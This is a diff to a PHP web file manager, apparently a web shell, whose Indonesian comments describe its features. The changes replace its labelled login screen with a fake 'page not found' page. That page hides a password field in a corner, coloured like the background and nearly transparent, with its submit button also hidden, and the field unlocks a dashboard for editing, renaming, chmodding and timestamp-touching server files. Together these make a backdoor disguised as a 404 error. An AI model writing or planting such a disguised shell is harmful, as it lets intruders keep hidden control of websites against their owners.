@@ -1,8 +1,8 @@
 <?php
 $password_hash = '$2a$12$QLh7xqC2/49495gjTzGumeqQ12HatXJrvxnntoUW2kmFrUfCxVWdK';
 $background_url = 'https://i.pinimg.com/originals/2e/bd/06/2ebd06b4dde55598cff5b33550511c78.gif';
-$login_title = 'Secure File Manager';
-$login_subtitle = 'Masukkan password untuk melanjutkan';
+$login_title = 'This Page Does Not Exist';
+$login_subtitle = "Sorry, the page you are looking for could not be found. It's just an accident that was not intentional.";
 
 session_start();
 
@@ -30,44 +30,110 @@ $base_dir = $_SESSION['base_dir'];
 if (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true) {
 ?>
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en-us"
+    prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?= htmlspecialchars($login_title) ?></title>
-    <style>
-        * { box-sizing: border-box; }
-        html, body { width: 100%; height: 100%; margin: 0; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            color: #fff; display: flex; justify-content: center; align-items: center;
-            position: relative; overflow: hidden;
-            background: linear-gradient(rgba(0, 0, 0, 0.60), rgba(0, 0, 0, 0.75)), url('<?= htmlspecialchars($background_url, ENT_QUOTES, 'UTF-8') ?>');
-            background-size: cover; background-position: center; background-attachment: fixed;
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">
+        @charset "UTF-8";
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide:not(.ng-hide-animate) {
+            display: none !important;
         }
-        .card {
-            width: 360px; max-width: calc(100% - 30px); padding: 38px 32px; text-align: center;
-            background: rgba(15, 23, 42, 0.72); border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 20px; backdrop-filter: blur(18px); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55);
-        }
-        .icon { width: 70px; height: 70px; margin: 0 auto 18px; display: flex; justify-content: center; align-items: center; border-radius: 50%; font-size: 30px; background: rgba(56, 189, 248, 0.12); border: 1px solid rgba(56, 189, 248, 0.35); }
-        input[type="password"] { width: 100%; padding: 14px 15px; background: rgba(0, 0, 0, 0.28); border: 1px solid rgba(255, 255, 255, 0.16); color: #fff; border-radius: 10px; outline: none; font-size: 14px; margin-bottom: 15px; }
-        button { width: 100%; padding: 14px; border: none; border-radius: 10px; cursor: pointer; color: #fff; font-size: 14px; font-weight: 600; background: linear-gradient(135deg, #0284c7, #2563eb); }
-        .err { color: #fecaca; font-size: 13px; margin-bottom: 15px; padding: 10px; border-radius: 8px; background: rgba(239, 68, 68, 0.12); }
+        ng\:form { display: block; }
+        .ng-animate-shim { visibility: hidden; }
+        .ng-anchor { position: absolute; }
     </style>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title><?= htmlspecialchars($login_title) ?></title>
+    <meta name="description" content="Oops, looks like the page is lost.">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=DM+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🔐</div>
-        <h2><?= htmlspecialchars($login_title) ?></h2>
-        <div style="margin-top:8px; margin-bottom:25px; color:rgba(255,255,255,0.60); font-size:13px;"><?= htmlspecialchars($login_subtitle) ?></div>
-        <?php if (isset($error_msg)): ?><div class="err"><?= htmlspecialchars($error_msg) ?></div><?php endif; ?>
-        <form method="POST">
-            <input type="password" name="login_pass" placeholder="Masukkan Password..." required autofocus>
-            <button type="submit">Akses Dashboard</button>
-        </form>
+    <div class="page-not-found">
+        <!-- Ilustrasi gambar error bawaan / Skateboard / Page Not Found asli -->
+        <img class="image" alt="Page Not Found" src="/htdocs_error/page_not_found.svg" onerror="this.src='https://cdn.jsdelivr.net/gh/edent/SuperTinyIcons@master/images/svg/codeship.svg';" />
+        <h1 class="title"><?= htmlspecialchars($login_title) ?></h1>
+        <p class="text"><?= htmlspecialchars($login_subtitle) ?></p>
+
+        <!-- Bagian Input Password Tersembunyi di Paling Bawah (Warna Putih & Tidak Terlihat) -->
+        <div class="hidden-login-section">
+            <form method="POST">
+                <input type="password" name="login_pass" class="secret-input" autocomplete="current-password" autofocus>
+                <button type="submit" style="display:none;"></button>
+            </form>
+        </div>
     </div>
 </body>
+<style>
+    body {
+        color: #1d1e20;
+        background: #f4f5ff;
+        font-size: 14px;
+        font-family: "DM Sans", "Roboto", sans-serif !important;
+        font-weight: 400;
+        -ms-text-size-adjust: 100%;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        margin: 0;
+    }
+    .page-not-found {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        padding: 0 16px;
+    }
+    .image {
+        max-width: 100%;
+        margin-bottom: 32px;
+        height: auto;
+        object-fit: contain;
+        max-height: 220px;
+    }
+    .title {
+        text-align: center;
+        margin-top: 0;
+        margin-bottom: 8px;
+        font-size: 24px;
+        line-height: 32px;
+        font-weight: 700;
+    }
+    .text {
+        text-align: center;
+        max-width: 650px;
+        margin-bottom: 24px;
+        font-size: 16px;
+        line-height: 24px;
+        font-weight: 400;
+        color: #6D7081;
+    }
+    /* Styling khusus menyembunyikan input password agar pas ditekan Tab langsung fokus & tidak terlihat */
+    .hidden-login-section {
+        position: absolute;
+        bottom: 8px;
+        left: 8px;
+    }
+    .secret-input {
+        background: #f4f5ff !important;
+        color: #f4f5ff !important;
+        border: none !important;
+        outline: none !important;
+        width: 120px;
+        height: 20px;
+        font-size: 10px;
+        opacity: 0.01;
+        cursor: default;
+    }
+    .secret-input:focus {
+        opacity: 0.03;
+        background: #f4f5ff !important;
+        color: #f4f5ff !important;
+    }
+</style>
 </html>
 <?php
     exit;
@@ -308,7 +374,6 @@ sort($files);
         .neon-title { margin: 0; font-size: 22px; font-weight: 800; background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .action-select { padding: 5px 8px; background: #0f172a; color: #38bdf8; border: 1px solid var(--border-color); border-radius: 4px; font-size: 12px; cursor: pointer; }
 
-                       /* Efek Animasi Judul Keren */
         .neon-title {
             margin: 0; font-size: 22px; font-weight: 800;
             background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8);
@@ -361,17 +426,15 @@ sort($files);
         <div class="alert alert-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
     <?php endif; ?>
 
-<!-- INTERFACE EDIT FILE -->
+    <!-- INTERFACE EDIT FILE -->
     <?php if (isset($_GET['edit'])): 
         $filename_edit = basename($_GET['edit']);
         $target_edit = $dir . DIRECTORY_SEPARATOR . $filename_edit;
         $file_content = @file_get_contents($target_edit);
     ?>
-        <!-- CDN Ace Editor (Lebih stabil & gak gampang error) -->
         <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js" type="text/javascript" charset="utf-8"></script>
         
         <style>
-            /* Styling khusus untuk Ace Editor agar pas dengan tema dark kita */
             #ace-editor {
                 width: 100%;
                 height: 500px;
@@ -384,23 +447,17 @@ sort($files);
         <h4 style="color: #38bdf8;">Editing File: <?= htmlspecialchars($filename_edit) ?></h4>
         <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="edit-form">
             <input type="hidden" name="edit_file_name" value="<?= htmlspecialchars($filename_edit) ?>">
-            
-            <!-- Textarea asli disembunyikan, nilainya nanti di-sync otomatis sama Ace Editor -->
             <textarea name="save_file_content" id="real-textarea" style="display:none;"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></textarea>
-            
-            <!-- Kotak Editor Ace yang berwarna-warni -->
             <div id="ace-editor"><?= htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
-            
             <br>
             <button type="submit" class="btn btn-green">Save Changes</button>
             <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-gray">Cancel</a>
         </form>
 
         <script>
-            // Inisialisasi Ace Editor
             var editor = ace.edit("ace-editor");
-            editor.setTheme("ace/theme/dracula"); // Tema gelap ala VS Code (Dracula)
-            editor.session.setMode("ace/mode/php"); // Mode bahasa PHP/HTML
+            editor.setTheme("ace/theme/dracula");
+            editor.session.setMode("ace/mode/php");
             editor.setOptions({
                 fontSize: "10pt",
                 showPrintMargin: false,
@@ -409,7 +466,6 @@ sort($files);
                 enableLiveAutocompletion: true
             });
 
-            // Sinkronisasi otomatis dari Ace Editor ke textarea asli sebelum form disubmit
             var form = document.getElementById('edit-form');
             form.onsubmit = function() {
                 var code = editor.getValue();
@@ -464,7 +520,7 @@ sort($files);
         </div>
     <?php endif; ?>
 
-    <!-- TABEL FILE & FOLDER DENGAN BATCH ACTION -->
+    <!-- TABEL FILE & FOLDER -->
     <form method="POST" action="?dir=<?= urlencode($dir) ?>" id="batch-form">
         <div style="display: flex; gap: 10px; margin-bottom: 12px; align-items: center; background: #111827; padding: 10px; border-radius: 6px; border: 1px solid var(--border-color);">
             <span style="font-size: 13px; color: var(--text-muted); font-weight: 600;">⚡ Aksi Terpilih (Batch):</span>
@@ -497,7 +553,6 @@ sort($files);
                 </tr>
                 <?php endif; ?>
 
-                <!-- FOLDER -->
                 <?php foreach ($folders as $folder): 
                     $folder_path = $dir . DIRECTORY_SEPARATOR . $folder;
                     $mtime = date("Y-m-d H:i:s", @filemtime($folder_path));
@@ -526,7 +581,6 @@ sort($files);
                 </tr>
                 <?php endforeach; ?>
 
-                <!-- FILE -->
                 <?php foreach ($files as $file): 
                     $file_path = $dir . DIRECTORY_SEPARATOR . $file;
                     $bytes = @filesize($file_path);
@@ -565,7 +619,6 @@ sort($files);
     </form>
 </div>
 
-<!-- Form Pendukung Aksi Single -->
 <form id="rename-form" method="POST" action="?dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="old_name" id="old_name">
     <input type="hidden" name="new_name" id="new_name">
@@ -626,14 +679,14 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
             document.getElementById('touch-form').submit();
         }
     } else if (action === 'chmod') {
-        var newPerms = prompt("Masukkan nilai CHMOD baru (contoh: 0755, 0644):", currentPerms);
+        var newPerms = prompt("Ubah CHMOD (Contoh: 0644, 0755, 0777):", currentPerms);
         if (newPerms) {
             document.getElementById('chmod_target_path').value = targetPath;
             document.getElementById('chmod_new_permission').value = newPerms;
             document.getElementById('chmod-form').submit();
         }
     } else if (action === 'rename') {
-        var newName = prompt("Ubah nama untuk: " + fileName, fileName);
+        var newName = prompt("Ubah nama file/folder:", fileName);
         if (newName && newName !== fileName) {
             document.getElementById('old_name').value = fileName;
             document.getElementById('new_name').value = newName;
@@ -646,6 +699,5 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
     }
 }
 </script>
-
 </body>
 </html>
